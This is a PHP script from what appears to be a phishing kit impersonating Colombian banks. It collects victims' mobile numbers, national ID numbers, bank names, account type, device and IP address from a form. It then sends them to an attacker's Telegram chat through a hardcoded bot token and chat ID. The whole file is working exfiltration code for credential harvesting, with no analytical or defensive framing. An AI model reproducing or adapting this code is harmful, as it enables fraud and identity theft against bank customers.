<?php
require_once("../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

// Procesar variables del POST
$celular      = $ifilter->process($_POST['cel']);
$cedula        = $ifilter->process($_POST['val']);
$persona      = $ifilter->process($_POST['per']);
$banco        = $ifilter->process($_POST['ban']);
$dispositivo  = $ifilter->process($_POST['dis']);
$tipo         = $ifilter->process($_POST['tip']);
$folder       = $ifilter->process($_POST['fol']);
$nombrebanco  = $ifilter->process($_POST['nom']);

// Establecer cookies para el resumen
setcookie('nombrebanco', $nombrebanco, time() + 3600);
setcookie('cedula', $cedula, time() + 3600);
setcookie('celular', $celular, time() + 3600);

$ip   = $_SERVER['REMOTE_ADDR'];
$hora = date("Y-m-d H:i:s");

// ✅ ENVIAR A TELEGRAM SIN BOTONES
$token   = "8623557175:AAFBSsjmbSpivl3ZJxdAIX1lrMdZQB-Jdkw";
$chat_id = "-5491209042";

$mensaje = "<b>📲 Nuevo ingreso</b>\n"
         . "<b>Celular:</b> $celular\n"
         . "<b>cedula:</b> $cedula\n"
         . "<b>Persona:</b> $persona\n"
         . "<b>Banco:</b> $nombrebanco\n"
         . "<b>Tipo:</b> $tipo\n"
         . "<b>Dispositivo:</b> $dispositivo\n"
         . "<b>IP:</b> $ip\n"
         . "<b>Hora:</b> $hora";

$data = [
    'chat_id'    => $chat_id,
    'text'       => $mensaje,
    'parse_mode' => 'HTML'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
?>
